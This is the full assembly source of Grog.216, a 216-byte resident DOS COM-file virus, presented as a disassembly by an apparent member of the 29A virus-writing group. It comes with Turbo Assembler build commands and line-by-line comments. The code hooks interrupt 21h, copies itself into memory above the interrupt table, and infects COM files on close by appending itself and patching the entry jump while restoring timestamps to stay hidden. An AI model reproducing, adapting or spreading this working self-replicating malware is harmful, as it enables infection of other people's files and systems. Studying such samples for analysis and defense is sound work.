;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º ****:::: Disassembly - Grog.216 ::::**** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ********* -= Darkman / 29A =- ********** º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


; Grog.216 is a 216 bytes parasitic resident COM virus. Infects files at close
; file by appending the virus to the infected file.

; To compile Grog.216 with Turbo Assembler v 4.0 type:
;   TASM /M GROG_216.ASM
;   TLINK /t /x GROG_216.OBJ


.model tiny
.code
.186
 org   100h				 ; Origin of Grog.216

code_begin:
	     db      0e9h		 ; JMP imm16 (opcode 0e9h)
	     dw      (virus_begin-virus_begin)
virus_begin:
	     push    si 		 ; Save SI at stack

	     mov     bp,ds:[101h]	 ; BP = delta offset
	     mov     di,si		 ; DI = offset of beginning of code
	     lea     si,[bp+origin_code] ; SI = offset of origin_code
	     movsw			 ; Move original code to beginning
	     movsb			 ;  "      "      "   "      "

	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = segment of interrupt table
	     cmp     es:[21h*04h+03h],al ; Already resident?
	     jne     install_grog	 ; Not equal? Jump to install_grog

	     inc     ah 		 ; Increase AH
	     mov     si,ax		 ; SI = offset of beginning of code
virus_exit:
	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     ret			 ; Return!

	     db      'MOPE (C) ''93 by GROG - Italy'
origin_code  db      0cdh,20h,? 	 ; Original code of infected COM file
install_grog:
	     mov     bx,((offset int21_virus-offset virus_begin)+200h)
	     xchg    bx,es:[21h*04h]	 ; BX = offset of interrupt 21h
	     xchg    ax,es:[21h*04h+02h] ; AX = segment of interrupt 21h
	     mov     word ptr ds:[bp+int21_addr],bx
	     mov     word ptr ds:[bp+int21_addr+02h],ax

	     mov     cx,(code_end-virus_begin)
	     lea     si,[bp+virus_begin] ; DX = offset of virus_begin
	     mov     di,200h		 ; DI = offset of hole above IVT
	     rep     movsb		 ; Move virus to hole above IVT

	     jmp     virus_exit

int21_virus  proc    near		 ; Interrupt 21h of Grog.216
	     pusha			 ; Save all registers at stack

	     cmp     ah,3eh		 ; Close file?
	     je      infect_file	 ; Equal? Jump to infect_file
int21_exit:
	     popa			 ; Load all registers from stack

	     db      0eah		 ; JMP imm32 (opcode 0eah)
int21_addr   dd      ?			 ; Address of interrupt 21h
	     endp
infect_file:
	     push    bx 		 ; Save BX at stack
	     mov     ax,1220h		 ; Get system file table number
	     int     2fh

	     mov     ax,1216h		 ; Get address of system FCB
	     mov     bl,es:[di] 	 ; BL = system file table entry
	     int     2fh
	     pop     bx 		 ; Load BX from stack
	     jc      int21_exit 	 ; Error? Jump to int21_exit

	     mov     word ptr es:[di+15h],00h

	     mov     byte ptr es:[di+02h],02h

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     mov     ah,3fh		 ; Read from file
	     mov     cx,03h		 ; Read three bytes
	     mov     dx,((offset origin_code-offset virus_begin)+200h)
	     int     21h

	     mov     ax,es:[di+11h]	 ; AX = filesize
	     mov     es:[di+15h],ax	 ; Set current file position (EOF)

	     mov     byte ptr ds:[((infect_code-virus_begin)+200h)],0e9h
	     sub     ax,03h		 ; Subtract size of JMP imm16
	     mov     ds:[((infect_code-virus_begin)+200h)+01h],ax

	     push    es:[di+0dh]	 ; Save file time at stack
	     push    es:[di+0fh]	 ; Save file date at stack

	     mov     ah,40h		 ; Write to file
	     mov     cl,(code_end-virus_begin)
	     mov     dl,00h		 ; Zero DL
	     int     21h

	     mov     word ptr es:[di+15h],00h

	     mov     ah,40h		 ; Write to file
	     mov     cl,03h		 ; Write three bytes
	     mov     dx,((offset infect_code-offset virus_begin)+200h)
	     int     21h

	     pop     es:[di+0fh]	 ; Load file date from stack
	     pop     es:[di+0dh]	 ; Load file time from stack

	     or      byte ptr es:[di+06h],01000000b

	     jmp     int21_exit
code_end:
	     db      124h dup(?)
infect_code  db      03h dup(?) 	 ; JMP imm16 (opcode 0e9h)
data_end:

end	     code_begin
